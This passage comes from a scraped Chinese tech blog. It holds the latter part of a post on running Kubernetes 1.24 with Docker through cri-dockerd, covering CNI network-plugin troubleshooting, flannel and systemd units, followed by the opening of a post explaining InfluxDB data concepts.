v1.24.0 [preflight] Running pre-flight checks [WARNING SystemVerification]: missing optional cgroups: blkio error execution phase preflight: [preflight] Some fatal errors occurred: [ERROR CRI]: container runtime is not running: output: time=\u0026#34;2022-07-31T15:41:42+08:00\u0026#34; level=debug msg=\u0026#34;get runtime connection\u0026#34; time=\u0026#34;2022-07-31T15:41:42+08:00\u0026#34; level=fatal msg=\u0026#34;unable to determine runtime API version: rpc error: code = Unavailable desc = connection error: desc = \\\u0026#34;transport: Error while dialing dial unix /var/run/cri-dockerd.sock: connect: connection refused\\\u0026#34;\u0026#34; , error: exit status 1 [preflight] If you know what you are doing, you can make a check non-fatal with `--ignore-preflight-errors=...` To see the stack trace of this error execute with --v=5 or higher 发现报错了level=fatal msg=\u0026quot;unable to determine runtime API version: rpc error: code = Unavailable desc = connection error: desc = \\\u0026quot;transport: Error while dialing dial unix /var/run/cri-dockerd.sock: connect: connection refused\\\u0026quot;。我们的socket没有连上。\n原因就是，我们安装了cri-dockerd后，它并不会像systemctl所管理的service，或者守护进程那样自动驻留在本机上。我们必须手动的启动cri-dockerd。\n所以，需要手动运行cri-dockerd，并且添加--pod-infra-container-image参数。（使用kubeadm config images list --config kubeadm1.24.conf可以知道需要的镜像版本）\n\u0026gt; cri-dockerd --pod-infra-container-image=registry.aliyuncs.com/google_containers/pause:3.7 INFO[0000] Connecting to docker on the Endpoint unix:///var/run/docker.sock INFO[0000] Start docker client with request timeout 0s INFO[0000] Hairpin mode is set to none INFO[0000] Docker cri networking managed by network plugin kubernetes.io/no-op INFO[0000] Docker Info: \u0026amp;{ID:HEPZ:PXCZ:XHZR:SKBX:TJL5:EG5L:U6P3:PI5A:PVZZ:ASKB:QJUC:QEDR Containers:2 ContainersRunning:1 ContainersPaused:0 ContainersStopped:1 Images:13 Driver:overlay2 DriverStatus:[[Backing Filesystem extfs] [Supports d_type true] [Native Overlay Diff true] [userxattr false]] SystemStatus:[] Plugins:{Volume:[local] Network:[bridge host ipvlan macvlan null overlay] Authorization:[] Log:[awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog]} MemoryLimit:true SwapLimit:true KernelMemory:false KernelMemoryTCP:false CPUCfsPeriod:true CPUCfsQuota:true CPUShares:true CPUSet:true PidsLimit:true IPv4Forwarding:true BridgeNfIptables:true BridgeNfIP6tables:true Debug:false NFd:31 OomKillDisable:false NGoroutines:39 SystemTime:2022-07-31T15:49:40.481000763+08:00 LoggingDriver:json-file CgroupDriver:systemd NEventsListener:0 KernelVersion:5.15.0-41-generic OperatingSystem:Ubuntu 22.04 LTS OSType:linux Architecture:x86_64 IndexServerAddress:https://index.docker.io/v1/ RegistryConfig:0xc0001de540 NCPU:4 MemTotal:8302116864 GenericResources:[] DockerRootDir:/var/lib/docker HTTPProxy: HTTPSProxy: NoProxy: Name:nm Labels:[] ExperimentalBuild:false ServerVersion:20.10.17 ClusterStore: ClusterAdvertise: Runtimes:map[io.containerd.runc.v2:{Path:runc Args:[]} io.containerd.runtime.v1.linux:{Path:runc Args:[]} runc:{Path:runc Args:[]}] DefaultRuntime:runc Swarm:{NodeID: NodeAddr: LocalNodeState:inactive ControlAvailable:false Error: RemoteManagers:[] Nodes:0 Managers:0 Cluster:\u0026lt;nil\u0026gt; Warnings:[]} LiveRestoreEnabled:false Isolation: InitBinary:docker-init ContainerdCommit:{ID:10c12954828e7c7c9b6e0ea9b0c02b01407d3ae1 Expected:10c12954828e7c7c9b6e0ea9b0c02b01407d3ae1} RuncCommit:{ID:v1.1.2-0-ga916309 Expected:v1.1.2-0-ga916309} InitCommit:{ID:de40ad0 Expected:de40ad0} SecurityOptions:[name=apparmor name=seccomp,profile=default name=cgroupns] ProductLicense: Warnings:[]} INFO[0000] Setting cgroupDriver systemd INFO[0000] Docker cri received runtime config \u0026amp;RuntimeConfig{NetworkConfig:\u0026amp;NetworkConfig{PodCidr:,},} INFO[0000] Starting the GRPC backend for the Docker CRI interface. INFO[0000] Start cri-dockerd grpc backend 我们看到，它已经连上了docker的endpoint。\n这时我们再另起一个终端，启动集群。\n需要注意，在清理集群时，要添加一个socket参数，如kubeadm reset --cri-socket unix:///var/run/cri-dockerd.sock。\n\u0026gt; kubeadm init --config kubeadm1.24.3.conf [init] Using Kubernetes version: v1.24.0 [preflight] Running pre-flight checks [WARNING SystemVerification]: missing optional cgroups: blkio [preflight] Pulling images required for setting up a Kubernetes cluster [preflight] This might take a minute or two, depending on the speed of your internet connection [preflight] You can also perform this action in beforehand using \u0026#39;kubeadm config images pull\u0026#39; [certs] Using certificateDir folder \u0026#34;/etc/kubernetes/pki\u0026#34; ... 在cri-dockerd的终端中，有了新的输出：\nINFO[0000] Start cri-dockerd grpc backend INFO[0157] Will attempt to re-write config file /var/lib/docker/containers/000f099fa98530c39e69458881c051f25200feb4f25dfd3d8f02f7444e6763ac/resolv.conf as [nameserver 192.168.153.2 nameserver 192.168.153.2 search ] INFO[0157] Will attempt to re-write config file /var/lib/docker/containers/ed0aa34e77adbf4ff444998b75e2365f1ebe44e831cdf4c55d3eecd4b6582958/resolv.conf as [nameserver 192.168.153.2 nameserver 192.168.153.2 search ] INFO[0157] Will attempt to re-write config file /var/lib/docker/containers/3431d46d839451adc30f1c44994990daed5b24899959aae34b5cfd3d5c695fc6/resolv.conf as [nameserver 192.168.153.2 nameserver 192.168.153.2 search ] INFO[0157] Will attempt to re-write config file /var/lib/docker/containers/50ae6ccb6e7c1420f58c1873bf2c17e291a26597a3b042b0df86a1ef2729470c/resolv.conf as [nameserver 192.168.153.2 nameserver 192.168.153.2 search ] ERRO[0167] ContainerStats resp: {0xc00098ea80 linux} ERRO[0168] ContainerStats resp: {0xc00098f440 linux} ERRO[0168] ContainerStats resp: {0xc000791b00 linux} 然而这里还报出一些奇怪的错误。\n我们查看docker容器：\n\u0026gt; docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES bbded4be83db a4ca41631cc7 \u0026#34;/coredns -conf /etc…\u0026#34; 2 minutes ago Up 2 minutes k8s_coredns_coredns-74586cf9b6-s6n6g_kube-system_68e930db-ac76-4995-bef2-a9f094b5cf88_0 173154bfdc43 a4ca41631cc7 \u0026#34;/coredns -conf /etc…\u0026#34; 2 minutes ago Up 2 minutes k8s_coredns_coredns-74586cf9b6-wstwx_kube-system_178e7a4e-3c35-42e6-b78b-1053274d9d4d_0 fb2810fe84a3 77b49675beae \u0026#34;/usr/local/bin/kube…\u0026#34; 2 minutes ago Up 2 minutes k8s_kube-proxy_kube-proxy-fpfq7_kube-system_3a52d7e5-ffa8-4193-a2de-948861818bf0_0 640f6546ff97 registry.aliyuncs.com/google_containers/pause:3.7 \u0026#34;/pause\u0026#34; 2 minutes ago Up 2 minutes k8s_POD_coredns-74586cf9b6-s6n6g_kube-system_68e930db-ac76-4995-bef2-a9f094b5cf88_0 8933a7f18e54 registry.aliyuncs.com/google_containers/pause:3.7 \u0026#34;/pause\u0026#34; 2 minutes ago Up 2 minutes k8s_POD_coredns-74586cf9b6-wstwx_kube-system_178e7a4e-3c35-42e6-b78b-1053274d9d4d_0 c2319d389da4 registry.aliyuncs.com/google_containers/pause:3.7 \u0026#34;/pause\u0026#34; 2 minutes ago Up 2 minutes k8s_POD_kube-proxy-fpfq7_kube-system_3a52d7e5-ffa8-4193-a2de-948861818bf0_0 c441aae26e22 88784fb4ac2f \u0026#34;kube-controller-man…\u0026#34; 2 minutes ago Up 2 minutes k8s_kube-controller-manager_kube-controller-manager-nm_kube-system_0b57267fec9fa21f5d899c064341d122_0 c2251251c6be e3ed7dee73e9 \u0026#34;kube-scheduler --au…\u0026#34; 2 minutes ago Up 2 minutes k8s_kube-scheduler_kube-scheduler-nm_kube-system_4b1a2622b0a7caad68556441288e8374_0 90df81c294fc aebe758cef4c \u0026#34;etcd --advertise-cl…\u0026#34; 2 minutes ago Up 2 minutes k8s_etcd_etcd-nm_kube-system_c305f8ecb58a3de0b142aa31e3c6e6cc_0 d14f4a822e37 529072250ccc \u0026#34;kube-apiserver --ad…\u0026#34; 2 minutes ago Up 2 minutes k8s_kube-apiserver_kube-apiserver-nm_kube-system_a38fd4cf236ff9d9bba5bb8f006ffdfd_0 000f099fa985 registry.aliyuncs.com/google_containers/pause:3.7 \u0026#34;/pause\u0026#34; 2 minutes ago Up 2 minutes k8s_POD_kube-scheduler-nm_kube-system_4b1a2622b0a7caad68556441288e8374_0 50ae6ccb6e7c registry.aliyuncs.com/google_containers/pause:3.7 \u0026#34;/pause\u0026#34; 2 minutes ago Up 2 minutes k8s_POD_kube-controller-manager-nm_kube-system_0b57267fec9fa21f5d899c064341d122_0 ed0aa34e77ad registry.aliyuncs.com/google_containers/pause:3.7 \u0026#34;/pause\u0026#34; 2 minutes ago Up 2 minutes k8s_POD_kube-apiserver-nm_kube-system_a38fd4cf236ff9d9bba5bb8f006ffdfd_0 3431d46d8394 registry.aliyuncs.com/google_containers/pause:3.7 \u0026#34;/pause\u0026#34; 2 minutes ago Up 2 minutes k8s_POD_etcd-nm_kube-system_c305f8ecb58a3de0b142aa31e3c6e6cc_0 系统的组件都启动了。\n\u0026gt; kubectl get cs Warning: v1 ComponentStatus is deprecated in v1.19+ NAME STATUS MESSAGE ERROR scheduler Healthy ok controller-manager Healthy ok etcd-0 Healthy {\u0026#34;health\u0026#34;:\u0026#34;true\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;\u0026#34;} \u0026gt; kubectl get pod -A NAMESPACE NAME READY STATUS RESTARTS AGE kube-system coredns-74586cf9b6-vpdp5 1/1 Running 0 33s kube-system coredns-74586cf9b6-zdfpw 1/1 Running 0 33s kube-system etcd-nm 1/1 Running 0 46s kube-system kube-apiserver-nm 1/1 Running 0 49s kube-system kube-controller-manager-nm 1/1 Running 0 49s kube-system kube-proxy-gs9lq 1/1 Running 0 33s kube-system kube-scheduler-nm 1/1 Running 0 46s 加入工作节点。\n\u0026gt; kubeadm join 192.168.153.21:6443 --token abcdef.0123456789abcdef \\ --discovery-token-ca-cert-hash sha256:d1902aa47f486d6fd1d35f7fb92286ffaa39da0437ded9be8d2de5670d52a8ca Found multiple CRI endpoints on the host. Please define which one do you wish to use by setting the \u0026#39;criSocket\u0026#39; field in the kubeadm configuration file: unix:///var/run/containerd/containerd.sock, unix:///var/run/cri-dockerd.sock 我们发现这里出现了运行时冲突，需要指定，这里就直接在命令行指明，如下：\n\u0026gt; kubeadm join 192.168.153.21:6443 --token abcdef.0123456789abcdef --discovery-token-ca-cert-hash sha256:d1902aa47f486d6fd1d35f7fb92286ffaa39da0437ded9be8d2de5670d52a8ca --cri-socket unix:///var/run/cri-dockerd.sock [preflight] Running pre-flight checks [WARNING SystemVerification]: missing optional cgroups: blkio [preflight] Reading configuration from the cluster... [preflight] FYI: You can look at this config file with \u0026#39;kubectl -n kube-system get cm kubeadm-config -o yaml\u0026#39; [kubelet-start] Writing kubelet configuration to file \u0026#34;/var/lib/kubelet/config.yaml\u0026#34; [kubelet-start] Writing kubelet environment file with flags to file \u0026#34;/var/lib/kubelet/kubeadm-flags.env\u0026#34; [kubelet-start] Starting the kubelet [kubelet-start] Waiting for the kubelet to perform the TLS Bootstrap... This node has joined the cluster: * Certificate signing request was sent to apiserver and a response was received. * The Kubelet was informed of the new secure connection details. Run \u0026#39;kubectl get nodes\u0026#39; on the control-plane to see this node join the cluster. 然后，我们看到节点已加入集群：\n\u0026gt; kubectl get nodes NAME STATUS ROLES AGE VERSION na Ready \u0026lt;none\u0026gt; 2m14s v1.24.3 nb Ready \u0026lt;none\u0026gt; 24s v1.24.3 nm Ready control-plane 7m33s v1.24.3 这里我不解的是，之前设置CNI前，core-dns的状态是pending，而且节点状态也是Not Ready。但是现在却看似一切正常。\n我们先使用简单的flannel做集群网络，注意不要忘记修改cidr为集群创建时指定的。\n\u0026gt; kubectl get pods -A NAMESPACE NAME READY STATUS RESTARTS AGE kube-flannel kube-flannel-ds-5v2vn 1/1 Running 0 41s kube-flannel kube-flannel-ds-bcgwm 1/1 Running 0 41s kube-flannel kube-flannel-ds-ctt4v 1/1 Running 0 41s kube-system coredns-74586cf9b6-vpdp5 1/1 Running 0 14m kube-system coredns-74586cf9b6-zdfpw 1/1 Running 0 14m kube-system etcd-nm 1/1 Running 0 15m kube-system kube-apiserver-nm 1/1 Running 0 15m kube-system kube-controller-manager-nm 1/1 Running 0 15m kube-system kube-proxy-6px66 1/1 Running 0 9m56s kube-system kube-proxy-cc4fw 1/1 Running 0 8m6s kube-system kube-proxy-gs9lq 1/1 Running 0 14m kube-system kube-scheduler-nm 1/1 Running 0 15m 网络CNI也正常工作了。\n然后我们部署一个简单的微服务应用试试。\n看似一切正常，但是我发现集群网络出现问题，不能访问service的服务。而且通过-o wide查看Pod发现他们并不在我所指定的CIDR网段，而是在一个奇怪的172网段。\n结合上面的，“还没有部署CNI节点和core-dns就Ready”这个奇怪的现象。我认为cri-dockerd的网络配置有问题。于是我又详细查看的参考资料，发现有一个配置和参考资料中的不一样。\n并且我们详细查看上面的cri-docker启动日志：\nINFO[0000] Docker cri networking managed by network plugin kubernetes.io/no-op cri-dockerd的网络是由network plugin kubernetes.io/no-op管理的，这是个啥？\nCNI 所以，这里就不得不讨论下kubernetes1.24之后的另一个重大改变：在 Kubernetes 1.24 之前，CNI 插件也可以由 kubelet 使用命令行参数 cni-bin-dir 和 network-plugin 管理。Kubernetes 1.24 移除了这些命令行参数， CNI 的管理不再是 kubelet 的工作。\n也就是说，kubelet已经从管理CNI中得到了解放。谁来管理cni呢？\n容器运行时。\n又回到参考资料中对cri-dockerd的配置，是这样写的：\nExecStart=/usr/bin/cri-dockerd --network-plugin=cni --pod-infra-container-image=registry.aliyuncs.com/google_containers/pause:3.7 对--network-plugin=cni进行了配置。上述cri-dockerd的启动参数中，有一句：\n--network-plugin string \u0026lt;Warning: Alpha feature\u0026gt; The name of the network plugin to be invoked for various events in kubelet/pod lifecycle. 于是我按照这个提示找到一篇解读kubelet配置cni的博文，Warning这句话正是原来在kubelet代码中的（见kubernetes/k8s CNI分析-容器网络接口分析）。\nkubelet网络插件有下面三种类型：\ncni kubenet noop：不配置网络插件 这样我们就明白了，在最初启动cri-dockerd的日志就表示我们并没有给cri-dockerd配置网络插件INFO[0000] Docker cri networking managed by network plugin kubernetes.io/no-op，结合它的启动参数--network-plugin，因此这个问题应该就是出于此。\n再次启动集群 我们先清除集群环境，包括flannel网络环境。\n在启动cri-dockerd的命令中加上网络插件参数。\n\u0026gt; cri-dockerd --pod-infra-container-image=registry.aliyuncs.com/google_containers/pause:3.7 --network-plugin=cni INFO[0000] Connecting to docker on the Endpoint unix:///var/run/docker.sock INFO[0000] Start docker client with request timeout 0s INFO[0000] Hairpin mode is set to none INFO[0000] Loaded network plugin cni INFO[0000] Docker cri networking managed by network plugin cni INFO[0000] Docker Info: \u0026amp;{ID:HEPZ:PXCZ:XHZR:SKBX:TJL5:EG5L:U6P3:PI5A:PVZZ:ASKB:QJUC:QEDR Containers:16 ContainersRunning:12 ContainersPaused:0 ContainersStopped:4 Images:15 Driver:overlay2 DriverStatus:[[Backing Filesystem extfs] [Supports d_type true] [Native Overlay Diff true] [userxattr false]] SystemStatus:[] Plugins:{Volume:[local] Network:[bridge host ipvlan macvlan null overlay] Authorization:[] Log:[awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog]} MemoryLimit:true SwapLimit:true KernelMemory:false KernelMemoryTCP:false CPUCfsPeriod:true CPUCfsQuota:true CPUShares:true CPUSet:true PidsLimit:true IPv4Forwarding:true BridgeNfIptables:true BridgeNfIP6tables:true Debug:false NFd:89 OomKillDisable:false NGoroutines:83 SystemTime:2022-07-31T16:59:32.329402283+08:00 LoggingDriver:json-file CgroupDriver:systemd NEventsListener:0 KernelVersion:5.15.0-41-generic OperatingSystem:Ubuntu 22.04 LTS OSType:linux Architecture:x86_64 IndexServerAddress:https://index.docker.io/v1/ RegistryConfig:0xc000468a10 NCPU:4 MemTotal:8302116864 GenericResources:[] DockerRootDir:/var/lib/docker HTTPProxy: HTTPSProxy: NoProxy: Name:nm Labels:[] ExperimentalBuild:false ServerVersion:20.10.17 ClusterStore: ClusterAdvertise: Runtimes:map[io.containerd.runc.v2:{Path:runc Args:[]} io.containerd.runtime.v1.linux:{Path:runc Args:[]} runc:{Path:runc Args:[]}] DefaultRuntime:runc Swarm:{NodeID: NodeAddr: LocalNodeState:inactive ControlAvailable:false Error: RemoteManagers:[] Nodes:0 Managers:0 Cluster:\u0026lt;nil\u0026gt; Warnings:[]} LiveRestoreEnabled:false Isolation: InitBinary:docker-init ContainerdCommit:{ID:10c12954828e7c7c9b6e0ea9b0c02b01407d3ae1 Expected:10c12954828e7c7c9b6e0ea9b0c02b01407d3ae1} RuncCommit:{ID:v1.1.2-0-ga916309 Expected:v1.1.2-0-ga916309} InitCommit:{ID:de40ad0 Expected:de40ad0} SecurityOptions:[name=apparmor name=seccomp,profile=default name=cgroupns] ProductLicense: Warnings:[]} INFO[0000] Setting cgroupDriver systemd INFO[0000] Docker cri received runtime config \u0026amp;RuntimeConfig{NetworkConfig:\u0026amp;NetworkConfig{PodCidr:,},} INFO[0000] Starting the GRPC backend for the Docker CRI interface. INFO[0000] Start cri-dockerd grpc backend 可以看到INFO[0000] Loaded network plugin cni。\n在另一个终端里，初始化集群，并安装flannel插件。\n\u0026gt; kubectl get pods -A NAMESPACE NAME READY STATUS RESTARTS AGE kube-system coredns-74586cf9b6-2p28x 0/1 Pending 0 46s kube-system coredns-74586cf9b6-lkrn6 0/1 Pending 0 46s kube-system etcd-nm 1/1 Running 0 58s kube-system kube-apiserver-nm 1/1 Running 0 58s kube-system kube-controller-manager-nm 1/1 Running 0 59s kube-system kube-proxy-qcgfk 1/1 Running 0 46s kube-system kube-scheduler-nm 1/1 Running 0 58s \u0026gt; kubectl get node NAME STATUS ROLES AGE VERSION na NotReady \u0026lt;none\u0026gt; 10s v1.24.3 nb NotReady \u0026lt;none\u0026gt; 13s v1.24.3 nm NotReady control-plane 2m34s v1.24.3 \u0026gt; kubectl apply -f ../network/flannel.yaml namespace/kube-flannel created clusterrole.rbac.authorization.k8s.io/flannel created clusterrolebinding.rbac.authorization.k8s.io/flannel created serviceaccount/flannel created configmap/kube-flannel-cfg created daemonset.apps/kube-flannel-ds created \u0026gt; kubectl get pods -A NAMESPACE NAME READY STATUS RESTARTS AGE kube-flannel kube-flannel-ds-2rcs4 1/1 Running 0 19s kube-flannel kube-flannel-ds-9szxg 1/1 Running 0 19s kube-flannel kube-flannel-ds-cxw5k 1/1 Running 0 19s kube-system coredns-74586cf9b6-2p28x 1/1 Running 0 3m22s kube-system coredns-74586cf9b6-lkrn6 1/1 Running 0 3m22s kube-system etcd-nm 1/1 Running 0 3m34s kube-system kube-apiserver-nm 1/1 Running 0 3m34s kube-system kube-controller-manager-nm 1/1 Running 0 3m35s kube-system kube-proxy-7lsdq 1/1 Running 0 77s kube-system kube-proxy-fb96h 1/1 Running 0 74s kube-system kube-proxy-qcgfk 1/1 Running 0 3m22s kube-system kube-scheduler-nm 1/1 Running 0 3m34s \u0026gt; kubectl get node NAME STATUS ROLES AGE VERSION na Ready \u0026lt;none\u0026gt; 76s v1.24.3 nb Ready \u0026lt;none\u0026gt; 79s v1.24.3 nm Ready control-plane 3m40s v1.24.3 安装flannel前，core-dns为pending、节点为NotReady。安装后正常，这是符合预期的。\n并且cri-dockerd中也打印了cni的信息：\nINFO[3090] Using CNI configuration file /etc/cni/net.d/10-flannel.conflist INFO[3095] Using CNI configuration file /etc/cni/net.d/10-flannel.conflist 再次部署用于测试的服务，一切正常：\n\u0026gt; kubectl get pods -o wide -n cinema NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES bookings-78c77d68f9-j5jzf 1/1 Running 0 17s 10.5.2.2 na \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; mongo-deploy-57dc8c8f49-n6psq 1/1 Running 0 17s 10.5.1.6 nb \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; movies-6fbc5986b9-vs6j8 1/1 Running 0 17s 10.5.2.3 na \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; showtimes-56fc847b7-4bq87 1/1 Running 0 17s 10.5.1.4 nb \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; users-6996b995d4-5l5tq 1/1 Running 0 17s 10.5.2.4 na \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; website-867ff4b9dd-5zz49 1/1 Running 0 17s 10.5.1.5 nb \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; \u0026gt; kubectl get svc -o wide -n cinema NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE SELECTOR bookings ClusterIP 10.110.129.6 \u0026lt;none\u0026gt; 8080/TCP 27s app=bookings mongodb-svc ClusterIP 10.103.92.132 \u0026lt;none\u0026gt; 27017/TCP 27s app=mongodb movies ClusterIP 10.103.102.97 \u0026lt;none\u0026gt; 8080/TCP 27s app=movies showtimes ClusterIP 10.96.139.99 \u0026lt;none\u0026gt; 8080/TCP 27s app=showtimes users ClusterIP 10.106.152.98 \u0026lt;none\u0026gt; 8080/TCP 27s app=users website NodePort 10.96.103.3 \u0026lt;none\u0026gt; 8080:30021/TCP 27s app=website 到这里，1.24.0版本的集群就正常部署Pod并提供服务了。\n一些问题 cri-dockerd报错 虽然目前功能上看来没啥问题，但是cri-dockerd一直打印错误信息：\nERRO[3404] ContainerStats resp: {0xc0003c8900 linux} ERRO[3404] ContainerStats resp: {0xc0005dcb00 linux} ERRO[3404] ContainerStats resp: {0xc0003c9c40 linux} ERRO[3404] ContainerStats resp: {0xc0005dd700 linux} ERRO[3404] ContainerStats resp: {0xc0007be540 linux} 我尝试在当前版本的源码中需要这句日志的输出位置，结果没有发现。然后在社区中提了这个issue。这个问题和社区中Lots of obscure error logging #85问题大概是一样的，可能是一些测试中的遗留，被误合并到主分支上去了。\n好在容器运行时的功能貌似没有受影响。\ncri-dockerd常驻一个终端 这种方法在安装cri-dockerd时将其视为一个软件，必须手动启动它，才可以让它监听socket实现和k8s以及docker的通信。博文基于docker和cri-dockerd部署Kubernetes 1.24中则是使用了另一种方法，并且为我本次的测试提供了很大的帮助。\n当然也可以按照cri-dockerd的文档，手动编译、部署。\n在博文基于docker和cri-dockerd部署Kubernetes 1.24中，作者的思路与官方的安装思路思路是一样的，即，创建一个可以被systemctl管理的service和socket对。让cri-dockerd在后台启动，不用显式启动并占用一个终端。\n其中，关键部分如下。\n首先，出于系统通用性，使用cri-dockerd的release中的.amd64.tgz版本。\n将文件解压，并将里面的可执行文件移动到/usr/bin/下面。\n\u0026gt; tar -xf cri-dockerd-0.2.3.amd64.tgz \u0026gt; cp cri-dockerd/cri-dockerd /usr/bin/ \u0026gt; chmod +x /usr/bin/cri-dockerd 然后很重要的一步，配置cri-dockerd的启动文件。在/usr/lib/systemd/system/cri-docker.service中写入以下内容：\n[Unit] Description=CRI Interface for Docker Application Container Engine Documentation=https://docs.mirantis.com After=network-online.target firewalld.service docker.service Wants=network-online.target Requires=cri-docker.socket [Service] Type=notify ExecStart=/usr/bin/cri-dockerd --network-plugin=cni --pod-infra-container-image=registry.aliyuncs.com/google_containers/pause:3.7 ExecReload=/bin/kill -s HUP $MAINPID TimeoutSec=0 RestartSec=2 Restart=always StartLimitBurst=3 StartLimitInterval=60s LimitNOFILE=infinity LimitNPROC=infinity LimitCORE=infinity TasksMax=infinity Delegate=yes KillMode=process [Install] WantedBy=multi-user.target 在/usr/lib/systemd/system/cri-docker.socket写入下面内容：\n[Unit] Description=CRI Docker Socket for the API PartOf=cri-docker.service [Socket] ListenStream=%t/cri-dockerd.sock SocketMode=0660 SocketUser=root SocketGroup=docker [Install] WantedBy=sockets.target 关于这两个配置文件，可以参考Linux配置service服务，systemd.socket 中文手册，这篇文章。\n然后我们启动这个服务，这样cri-dockerd实际上就有我们刚才创建的名叫cri-docker的service所管理：\nsystemctl daemon-reload\rsystemctl start cri-docker\rsystemctl enable cri-docker\rsystemctl status cri-docker 这样一来，在每次启动集群前，就不要手动的配置运行cri-dockerd，systemd就帮我们完成这些操作了。\n参考资料 基于docker和cri-dockerd部署Kubernetes 1.24 一文搞懂容器运行时 Containerd Open Container Initiative 将 Docker Engine 节点从 dockershim 迁移到 cri-dockerd 更新：移除 Dockershim 的常见问题 检查移除 Dockershim 是否对你有影响 排查 CNI 插件相关的错误 容器运行时 网络插件 kubernetes-sigs/cri-tools Mirantis/cri-dockerd k8s卸载flannel网络 kubernetes/k8s CNI分析-容器网络接口分析 Linux配置service服务 ","date":"2022-08-01T18:10:59+08:00","image":"https://picgo-lzl.oss-cn-beijing.aliyuncs.com/image-20230111161434207.png","permalink":"https://lizonglingo.github.io/p/cri-dockerd%E5%9C%A8kubernetes1.24%E5%90%8E%E7%BB%A7%E7%BB%AD%E4%BD%BF%E7%94%A8docker%E4%BD%9C%E4%B8%BA%E5%AE%B9%E5%99%A8%E8%BF%90%E8%A1%8C%E6%97%B6/","title":"cri-dockerd，在kubernetes1.24后继续使用Docker作为容器运行时"},{"content":"概念 作为目前最流行的时序数据库之一，InfluxDB常用于监控系统数据采集。在使用它之前，我们需要了解一些InfluxDB的概念。以下内容多翻译自官方文档。\nInfluxDB数据元素 以下数据元素为InfluxDB2.0版本所包含的。\nbucket中的数据大概长这个样子：\nTimestamp 所有存储在InfluxDB中的数据都有一个_time列来存储时间戳。时间戳存储为纳秒的形式。其日期和时间显示格式为RFC3339UTC时间，如2020-01-01T00:00:00.00Z。在写入数据时，时间戳的精度很重要。\nMeasurement _measurement列作为tags、fields以及timestamps的容器，它是个字符串。我们可以把它理解为表名（如果按照关系型数据库如MySql，它更像表名，代表一张表所记录的内容），就上面的图中，可以说_measurement census所代表的是对指标bees、ants的记录。\nFields 一个field包含一个字段键，存储在_field列中；以及一个字段值，存储在_value列中。就上面图而言，有字段bees=23, ants=30等4个fields。\nField key 字段的键表示字段名称，如bees, ants这两个键。\nField value 字段的值。值的类型可以是strings、floats、integers或是booleans。例如，bees在不同时间的值是23，28。\nField set 字段集合指的是同一个时间戳下面的一组键值的集合，例如时间戳2019-08-18T00:00:00Z这个时间戳对应的Field set为：census bees=23,ants=30\n需要注意的是，Fields是不被索引的，因此使用Fields做为查询条件是需要遍历大量的数据，造成查询效率低下。所以需要使用tags做为查询条件，它会被索引。因此我们将经常需要查询的元数据放在tags中，以加速查询效率。\nTags 上图中的location和scientist以及它们对应的值都是标签。标签包含标签的键及标签的值，也是以key-value形式存储。\nTag key 上图中的location和scientist为标签的key。Tag key类型为string。\nTag value 上图中location有两个值，为klamath以及 portland。Tag value类型为string。\nTag set Tag键值对的集合为Tag set。上图中包含的Tag set包含四组标签键值对。\nlocation = klamath, scientist = anderson location = portland, scientist = anderson location = klamath, scientist = mullen location = portland, scientist = mullen Tags是被索引的，同时Tags也是可选的。对Tags的查询要比Fields快。\n那么，Tags应该如何设计以适应它常用做查询的条件呢？\nTags应该包含高度可变，特殊的信息，如UUID、哈希或者随机字符串，能够在数据库中对某条记录有特殊的标识。\nBucket schema 我们先来理解下为什么在InfluxDB中schema是个很重要的概念。例如我们重点查询的数据在fields中，下面是查询bees=23的数据：\nfrom(bucket: \u0026#34;bucket-name\u0026#34;) |\u0026gt; range(start: 2019-08-17T00:00:00Z, stop: 2019-08-19T00:00:00Z) |\u0026gt; filter(fn: (r) =\u0026gt; r._field == \u0026#34;bees\u0026#34; and r._value == 23) InfluxDB将会便利每一个field的值，找到所有的结果再返回。当我们的measurement 有几百万的数据列是，这非常花时间。\n因此，为了优化查询，我们可以使用schema改变这些fields（如bees和ants），让它们变成tags，同时让原本的tags变为fields。数据就会变成下面的样子：\n这样就加快了数据查询效率。\n通常，一个有详细的schema-type的bucket指的是，这个bucket中的每一个measurement都有一个明确的schema。这个schema限制了数据写入measurement的形式。\n例如，下面的schema用来限制measurement census的数据：\nSeries Serices包含series以及series key两个概念。\n首先，一个series key是一系列点的集合，这些数据点共享同一个measurement、tag set以及field key。例如，示例数据中包含下面两个不同的series key：\n换句话说，一个series key所包含数据有相同的measurement、tag set以及field key，这些数据最大的不同就是field value。这这一组相同的measurement、tag set以及field key就组成了一个series的series key。\n而series是一个series key对应的数据序列，序列中的数据包含timestamp以及field value。下面是一对series key - series的例子：\n# series key\rcensus,location=klamath,scientist=anderson bees\r# series\r2019-08-18T00:00:00Z 23\r2019-08-18T00:06:00Z 28 好好理解Series的概念，这个对于设计如何存储数据很有帮助（如哪些数据应该存放在Fields中哪些可以放在Tags中）。\nPoint 一个point包含一个series key，一个field value以及一个timestamp，我们可以把它理解为一条数据记录，如2019-08-18T00:00:00Z census ants 30 portland mullen。\nBucket 所有的InfluxDB中的数据都存储在bucket中。Bucket结合了数据库以及数据保留期这两个概念。此外，一个bucket属于一个organization。\nOrganization 一个organization是一个用户团体的工作空间。InfluxDB中的dashboard、tasks、buckets以及users这些概念都要属于一个organization。\nInfluxDB数据组织形式 原文是“data schema”，我将其理解为数据的组织形式，或是模式、规范。\nInfluxDB使用**time-structured merge tree（TSM）这个数据结构存储数据，同时使用了time series index（TSI）**有效的压缩数据。\n此外，InfluxDB提供了扁平化的数据组织形式，包括下面几部分：\nAnnotation rows Header row Data rows Other columns Group keys 这样的数据组织形式多用于查看原始数据、或是以CSV格式的返回数据。\nAnnotation rows 注释行描述了列的熟悉，如：\n#group #datatype #default Header row 标头行定义了列的标签，描述每一列数据的含义，就是列名，如：\ntable _time _value _field _measurement 还有tag key的名字，如tag-1，tag-2 Data rows 每个数据行包含header row所指明的数据，一行是一个point。\nOther columns 下面几个列是可选的，用来附加一些数据信息：\nannotation result table Group keys 决定数据聚合内容。关于Grouping操作看这里。\nInfluxDB的设计准则 